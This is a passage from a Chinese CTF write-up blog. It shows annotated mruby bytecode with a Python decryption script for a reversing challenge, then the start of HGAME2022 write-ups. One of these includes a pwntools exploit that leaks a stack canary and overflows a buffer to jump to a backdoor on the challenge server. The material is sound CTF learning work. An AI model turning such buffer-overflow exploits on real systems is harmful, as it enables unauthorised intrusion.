class="number">1</span></span><br><span class="line">      <span class="number">058</span> MOVER7R11; R7:num1</span><br><span class="line">          <span class="comment">//num1=ord(t[n])&lt;&lt;24</span></span><br><span class="line">      <span class="number">061</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">064</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">067</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">070</span> ADDIR13<span class="number">1</span></span><br><span class="line">      <span class="number">073</span> GETIDXR12R13</span><br><span class="line">      <span class="number">075</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">079</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">083</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">086</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">090</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+1])&lt;&lt;16</span></span><br><span class="line">      <span class="number">092</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">095</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">098</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">101</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">104</span> ADDIR13<span class="number">2</span></span><br><span class="line">      <span class="number">107</span> GETIDXR12R13</span><br><span class="line">      <span class="number">109</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">113</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">117</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">120</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">124</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+2])&lt;&lt;8</span></span><br><span class="line">      <span class="number">126</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">129</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">132</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">135</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">138</span> ADDIR13<span class="number">3</span></span><br><span class="line">      <span class="number">141</span> GETIDXR12R13</span><br><span class="line">      <span class="number">143</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">147</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">151</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+3])</span></span><br><span class="line">      <span class="number">153</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">156</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">159</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">162</span> ADDIR12<span class="number">4</span></span><br><span class="line">      <span class="number">165</span> GETIDXR11R12</span><br><span class="line">      <span class="number">167</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">171</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">175</span> LOADIR12<span class="number">24</span></span><br><span class="line">      <span class="number">178</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">182</span> MOVER8R11; R8:num2</span><br><span class="line">          <span class="comment">//num2=ord(t[n+4])&lt;&lt;24</span></span><br><span class="line">      <span class="number">185</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">188</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">191</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">194</span> ADDIR13<span class="number">5</span></span><br><span class="line">      <span class="number">197</span> GETIDXR12R13</span><br><span class="line">      <span class="number">199</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">203</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">207</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">210</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">214</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2+=ord(t[n+5])&lt;&lt;16</span></span><br><span class="line">      <span class="number">216</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">219</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">222</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">225</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">228</span> ADDIR13<span class="number">6</span></span><br><span class="line">      <span class="number">231</span> GETIDXR12R13</span><br><span class="line">      <span class="number">233</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">237</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">241</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">244</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">248</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+6])&lt;&lt;8</span></span><br><span class="line">      <span class="number">250</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">253</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">256</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">259</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">262</span> ADDIR13<span class="number">7</span></span><br><span class="line">      <span class="number">265</span> GETIDXR12R13</span><br><span class="line">      <span class="number">267</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">271</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">275</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+7])</span></span><br><span class="line">      <span class="number">277</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">280</span> MOVER12R7; R7:num1</span><br><span class="line">      <span class="number">283</span> MOVER13R8; R8:num2</span><br><span class="line">      <span class="number">286</span> MOVER14R4; R4:key</span><br><span class="line">      <span class="number">289</span> SSENDR11:enc_onen=<span class="number">3</span></span><br><span class="line">      <span class="number">293</span> AREFR9R11<span class="number">0</span>; R9:enum1</span><br><span class="line">      <span class="number">297</span> AREFR10R11<span class="number">1</span>; R10:enum2</span><br><span class="line">          <span class="comment">//enum1,enum2=enc_one(num1,num2,key)</span></span><br><span class="line">      <span class="number">301</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">304</span> MOVER12R9; R9:enum1</span><br><span class="line">      <span class="number">307</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum1)</span></span><br><span class="line">      <span class="number">311</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">314</span> MOVER12R10; R10:enum2</span><br><span class="line">      <span class="number">317</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum2)</span></span><br><span class="line">      <span class="number">321</span> ADDIR6<span class="number">8</span>; R6:n</span><br><span class="line">      <span class="number">324</span> JMP<span class="number">019</span></span><br><span class="line">          <span class="comment">//步长为8的循环</span></span><br><span class="line">      <span class="number">327</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">330</span> BLOCKR12<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b3f50</span>)</span></span><br><span class="line">      333 SENDBR11:collectn=<span class="number">0</span></span><br><span class="line">      <span class="number">337</span> STRINGR12<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; </span><br><span class="line">      <span class="number">340</span> SENDR11:joinn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//调用&quot;&quot;.join(c.collect(0x18b3f50))</span></span><br><span class="line">      <span class="number">344</span> RETURNR11</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3f50</span> nregs=<span class="number">7</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:x</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> STRINGR4L(<span class="number">0</span>); %<span class="number">.8</span>x</span><br><span class="line">      <span class="number">007</span> MOVER5R1; R1:x</span><br><span class="line">      <span class="number">010</span> SSENDR3:<span class="built_in">sprintf</span>n=<span class="number">2</span></span><br><span class="line">          <span class="comment">//进制转换</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4020</span> nregs=<span class="number">6</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">007</span> STRINGR4<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; L*</span><br><span class="line">      <span class="number">010</span> SENDR3:unpackn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//每四个字节转成一个整数</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b40f0</span> nregs=<span class="number">11</span> nlocals=<span class="number">8</span> pools=<span class="number">0</span> syms=<span class="number">2</span> reps=<span class="number">1</span> ilen=<span class="number">42</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:num1</span><br><span class="line">  R2:num2</span><br><span class="line">  R3:key</span><br><span class="line">  R4:&amp;</span><br><span class="line">  R5:y</span><br><span class="line">  R6:z</span><br><span class="line">  R7:s</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">3</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0xc0000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER8R1; R1:num1</span><br><span class="line">      <span class="number">007</span> MOVER9R2; R2:num2</span><br><span class="line">      <span class="number">010</span> LOADI_0R10</span><br><span class="line">      <span class="number">012</span> MOVER5R8; R5:y</span><br><span class="line">      <span class="number">015</span> MOVER6R9; R6:z</span><br><span class="line">      <span class="number">018</span> MOVER7R10; R7:s</span><br><span class="line">      <span class="number">021</span> GETCONSTR8YY</span><br><span class="line">      <span class="number">024</span> BLOCKR9<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b41c0</span>)</span></span><br><span class="line">      027 SENDBR8:timesn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//循环YY次</span></span><br><span class="line">      <span class="number">031</span> MOVER8R5; R5:y</span><br><span class="line">      <span class="number">034</span> MOVER9R6; R6:z</span><br><span class="line">          <span class="comment">//返回y,z</span></span><br><span class="line">      <span class="number">037</span> ARRAYR8R8<span class="number">2</span></span><br><span class="line">      <span class="number">040</span> RETURNR8</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b41c0</span> nregs=<span class="number">10</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">0</span> ilen=<span class="number">186</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:i</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="comment">//不太重要的位操作</span></span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> GETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">008</span> GETUPVARR4<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">012</span> LOADI_3R5</span><br><span class="line">      <span class="number">014</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">018</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">022</span> LOADI_5R6</span><br><span class="line">      <span class="number">024</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">028</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">032</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">036</span> ADDR4R5</span><br><span class="line">      <span class="number">038</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">042</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">046</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">050</span> LOADIR8<span class="number">11</span></span><br><span class="line">      <span class="number">053</span> SENDR7:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">057</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">060</span> LOADI_3R8</span><br><span class="line">      <span class="number">062</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">066</span> GETIDXR6R7</span><br><span class="line">      <span class="number">068</span> ADDR5R6</span><br><span class="line">      <span class="number">070</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">074</span> ADDR3R4</span><br><span class="line">      <span class="number">076</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">080</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">083</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">087</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">091</span> GETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">095</span> GETCONSTR4XX</span><br><span class="line">      <span class="number">098</span> ADDR3R4</span><br><span class="line">      <span class="number">100</span> SETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">104</span> GETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">108</span> GETUPVARR4<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">112</span> LOADI_3R5</span><br><span class="line">      <span class="number">114</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">118</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">122</span> LOADI_5R6</span><br><span class="line">      <span class="number">124</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">128</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">132</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">136</span> ADDR4R5</span><br><span class="line">      <span class="number">138</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">142</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">146</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">150</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">153</span> LOADI_3R8</span><br><span class="line">      <span class="number">155</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">159</span> GETIDXR6R7</span><br><span class="line">      <span class="number">161</span> ADDR5R6</span><br><span class="line">      <span class="number">163</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">167</span> ADDR3R4</span><br><span class="line">      <span class="number">169</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">173</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">176</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">180</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">184</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4320</span> nregs=<span class="number">13</span> nlocals=<span class="number">8</span> pools=<span class="number">2</span> syms=<span class="number">7</span> reps=<span class="number">0</span> ilen=<span class="number">128</span><span class="comment">// 主逻辑check()</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">  R3:i</span><br><span class="line">  R4:lst_ch</span><br><span class="line">  R5:c</span><br><span class="line">  R6:k</span><br><span class="line">  R7:cipher_text</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> LOADI_0R3; R3:i</span><br><span class="line">      <span class="number">006</span> LOADI_0R4; R4:lst_ch</span><br><span class="line">          <span class="comment">//i和lst_ch初试均为0</span></span><br><span class="line">      <span class="number">008</span> MOVER8R3; R3:i</span><br><span class="line">      <span class="number">011</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">014</span> SENDR9:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">018</span> LTR8R9</span><br><span class="line">      <span class="number">020</span> JMPNOTR8<span class="number">086</span></span><br><span class="line">          <span class="comment">//以上是对i做循环，条件为`for i in range(len(p))`</span></span><br><span class="line">      <span class="number">024</span> MOVER8R1; R1:p</span><br><span class="line">      <span class="number">027</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">030</span> GETIDXR8R9</span><br><span class="line">          <span class="comment">//取p[i]</span></span><br><span class="line">      <span class="number">032</span> SENDR8:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">036</span> MOVER5R8; R5:c</span><br><span class="line">          <span class="comment">//ord(p[i])赋值给c</span></span><br><span class="line">      <span class="number">039</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">042</span> MOVER9R4; R4:lst_ch</span><br><span class="line">      <span class="number">045</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//取c和lst_ch进行异或</span></span><br><span class="line">      <span class="number">049</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">052</span> ADDIR9<span class="number">1</span></span><br><span class="line">          <span class="comment">//取i+1</span></span><br><span class="line">      <span class="number">055</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//将c^lst_ch的结果和(i+1)异或</span></span><br><span class="line">      <span class="number">059</span> SENDR8:chrn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//将该结果chr回来</span></span><br><span class="line">      <span class="number">063</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">066</span> MOVER10R3; R3:i</span><br><span class="line">      <span class="number">069</span> MOVER11R8</span><br><span class="line">      <span class="number">072</span> SETIDXR9R10R11</span><br><span class="line">          <span class="comment">//将chr后的字符赋值给p[i]</span></span><br><span class="line">      <span class="number">074</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">077</span> MOVER4R8; R4:lst_ch</span><br><span class="line">          <span class="comment">//把c的值赋给lst_ch</span></span><br><span class="line">      <span class="number">080</span> ADDIR3<span class="number">1</span>; R3:i</span><br><span class="line">      <span class="number">083</span> JMP<span class="number">008</span></span><br><span class="line">          <span class="comment">//步长循环为1</span></span><br><span class="line">      <span class="number">086</span> STRINGR6<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; aaaassssddddffff; R6:k</span><br><span class="line">          <span class="comment">//循环结束后定义k=&#x27;aaaassssddddffff&#x27;</span></span><br><span class="line">      <span class="number">089</span> GETCONSTR8Crypt</span><br><span class="line">      <span class="number">092</span> GETMCNSTR8R8::CIPHER</span><br><span class="line">      <span class="number">095</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">098</span> MOVER10R6; R6:k</span><br><span class="line">      <span class="number">101</span> SENDR8:encryptn=<span class="number">2</span></span><br><span class="line">          <span class="comment">//调用Crypt.CIPHER.encrypt(p, k)</span></span><br><span class="line">      <span class="number">105</span> MOVER7R8; R7:cipher_text</span><br><span class="line">      <span class="number">108</span> MOVER8R7; R7:cipher_text</span><br><span class="line">          <span class="comment">//将加密结果赋值给cipher_text</span></span><br><span class="line">      <span class="number">111</span> STRINGR9<span class="title function_">L</span><span class="params">(<span class="number">1</span>)</span>; f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb</span><br><span class="line">      <span class="number">114</span> EQR8R9</span><br><span class="line">          <span class="comment">//将cipher_text与f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb进行比较</span></span><br><span class="line">      <span class="number">116</span> JMPNOTR8<span class="number">124</span></span><br><span class="line">      <span class="number">120</span> LOADTR8</span><br><span class="line">      <span class="number">122</span> RETURNR8</span><br><span class="line">      <span class="number">124</span> LOADFR8</span><br><span class="line">      <span class="number">126</span> RETURNR8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_key</span>(<span class="params">p</span>):</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p), <span class="number">4</span>):</span><br><span class="line">        a.append(<span class="built_in">int</span>(p.encode()[i:i+<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line">c = <span class="string">&quot;f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb&quot;</span></span><br><span class="line">XX = <span class="number">305419896</span></span><br><span class="line">YY = <span class="number">16</span></span><br><span class="line">key = to_key(<span class="string">&quot;aaaassssddddffff&quot;</span>)</span><br><span class="line"> </span><br><span class="line">dec = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">16</span>):</span><br><span class="line">    num1 = <span class="built_in">int</span>(c[i:i+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    num2 = <span class="built_in">int</span>(c[i+<span class="number">8</span>:i+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">    y = num1  <span class="comment"># R5</span></span><br><span class="line">    z = num2  <span class="comment"># R6</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        s = s + XX</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        z = z - ((((y &lt;&lt; <span class="number">3</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (s + key[(s + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        z = z &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = s - XX</span><br><span class="line">        y = y - ((((z &lt;&lt; <span class="number">3</span>) ^ (z &gt;&gt; <span class="number">5</span>)) + z) ^ (s + key[((s &gt;&gt; <span class="number">11</span>) + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        y = y &amp; <span class="number">0xffffffff</span></span><br><span class="line">    dec[i//<span class="number">2</span>:i//<span class="number">2</span>+<span class="number">4</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(y)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line">    dec[i//<span class="number">2</span>+<span class="number">4</span>:i//<span class="number">2</span>+<span class="number">8</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(z)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line"><span class="built_in">print</span>(dec.<span class="built_in">hex</span>())</span><br><span class="line">lst_ch = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec)):</span><br><span class="line">    c = dec[i]</span><br><span class="line">    dec[i] = (c ^ (i + <span class="number">1</span>)) ^ lst_ch</span><br><span class="line">    lst_ch = dec[i]</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;考研选手来摸鱼。&lt;/p&gt;
&lt;p&gt;今年国赛菜得很快乐，趟得也很快乐~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2022</title>
    <link href="http://example.com/2022/01/24/hgame2022/"/>
    <id>http://example.com/2022/01/24/hgame2022/</id>
    <published>2022-01-24T07:19:07.000Z</published>
    <updated>2023-02-01T14:30:53.472Z</updated>
    
    <content type="html"><![CDATA[<p>闲着时就去打了下杭电的 HGAME2022，以为第一周的题目都会蛮简单的，没想到每道题都花了不少功夫，出题人甚至还只是大二学生，顿时感觉到参差了。</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="test-your-gdb"><a href="#test-your-gdb" class="headerlink" title="test_your_gdb"></a>test_your_gdb</h3><p>先检查一下保护</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/142799/6/33729/24698/63c7a9bcF35bfad36/6fed4a2b8bff6c89.png" style="zoom:80%;" /><p>再看一下程序逻辑</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/101274/4/36756/155822/63c7a9feF099d1b28/cfdd54cc86c9145f.png" style="zoom:80%;" /><p>动调直接去看加密后的 s2，我们大概停在判断位置处，看一下 s2 即 <strong>rsi</strong> 的值</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/160500/8/33195/17712/63c7aa34F130596f6/e241e939f93143d9.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/137137/5/32624/66896/63c7aa4dF03e59ce9/efe2f0a3602f0da7.png" style="zoom:80%;" /><p>上图显示不全，因为一共要比较 16 个字节：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55339/21/22199/50202/63c7aa63F62dce033/9aee5be3ca36bf1b.png" style="zoom:80%;" /><p>所以 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">50610</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">backdoor=<span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0xb0361e0e8294f147</span>)+p64(<span class="number">0x8c09e0c34ed8a6a9</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;enter your pass word\n&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">24</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="enter-the-pwn-land"><a href="#enter-the-pwn-land" class="headerlink" title="enter_the_pwn_land"></a>enter_the_pwn_land</h3><p>先检查一下保护：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75946/29/24063/23754/63c7aaa1Fdf2816d1/56fe50f63cfa50e0.png" style="zoom:80%;" /><p>看一下主要函数：</p><img 